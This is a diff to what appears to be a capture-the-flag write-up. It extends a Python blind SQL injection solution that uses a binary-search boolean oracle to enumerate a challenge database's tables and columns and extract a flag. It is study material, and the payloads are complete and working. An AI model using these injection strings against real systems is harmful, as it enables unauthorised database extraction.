@@ -160,7 +160,7 @@ def charify(string):
     result += ",CHAR({})".format(ord(c))
   return result
 
-def exec(query):
+def query(query):
     """ Execute a sql query
     return the sql error, or 0 if none was generated
     1048: cant be null
@@ -216,3 +216,96 @@ def binsearch(binTest):
 
 Yes, this is a lot of boilerplate code, and yes this is painful to read.
 But it's stuff i wrote long ago, and hey it works
+
+### Getting the tables
+
+Now, let's move to our first query. The goal is to enumerate all the tables in the database.
+This is normally done with this query
+
+```sql
+SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_TYPE = 'BASE TABLE'
+```
+
+Which can be modified to work with the binary search decorator in this way:
+
+```python
+from boilerplate import S, query, binsearch
+
+@binsearch
+def get_all_tables(confront_char, positionInString):
+    confront_char = ord(confront_char) #use for binary sarch
+    get_char = f"(SELECT ORD(SUBSTRING(group_concat(TABLE_NAME), {positionInString},1)) FROM INFORMATION_SCHEMA.tables where TABLE_TYPE = {S('BASE TABLE')} )"
+    boolean_oracle = f"if(( {get_char} < {confront_char} ), char(43), null)"
+    q= f"asd\\' LIKE {boolean_oracle} ) -- ' or 1=1 "
+    ret = query(q, False)
+    return ret == "0"
+
+get_all_tables()
+
+```
+
+When executed, this outputs:
+
+```text
+Logs, Settings
+```
+
+### Getting the table schema
+
+A small change to the previous function allows us to retrieve the columns in both tables
+
+```python
+from boilerplate import S, query, binsearch
+
+@binsearch
+def get_columns(confront_char, positionInString):
+    confront_char = ord(confront_char) #use for binary sarch
+    tableName = S('Logs')
+    get_char = f"(SELECT ord(SUBSTRING(group_concat(COLUMN_NAME), {positionInString}, 1)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = {tableName})"
+    boolean_oracle = f"if(( {get_char} < {confront_char} ), char(43), null)"
+    q= f"asd\\' LIKE {boolean_oracle} ) -- ' or 1=1 "
+    ret = query(q, False)
+    return ret == "0"
+
+
+get_columns()
+
+```
+
+This reveals that the columns in Settings are `s_key, s_value`
+and the columns in Logs are ` id,tstamp,ipaddr,payload `
+
+### Getting the flag
+
+The settings table looks interesting, let's read its content:
+
+```python
+from boilerplate import S, query, binsearch
+
+@binsearch
+def get_content(confront_char, positionInString):
+    confront_char = ord(confront_char) #use for binary sarch
+    get_char = f"(SELECT ord(SUBSTRING(group_concat(s_value), {positionInString}, 1)) FROM Settings)"
+    boolean_oracle = f"if(( {get_char} < {confront_char} ), char(43), null)"
+    q= f"asd\\' LIKE {boolean_oracle} ) -- ' or 1=1 "
+    ret = query(q, False)
+    return ret == "0"
+
+
+
+get_content()
+
+```
+
+This reveals the content of the column s_key:
+`mod_insecurity_app_token, mod_insecurity_license`
+
+Applying the same search for the s_value column finally reveals the flag
+`ccit{Be435b52CE33SWPG83SH5xRfr3oHialL},sD9Gq97Q`
+
+
+
+
+
+
+
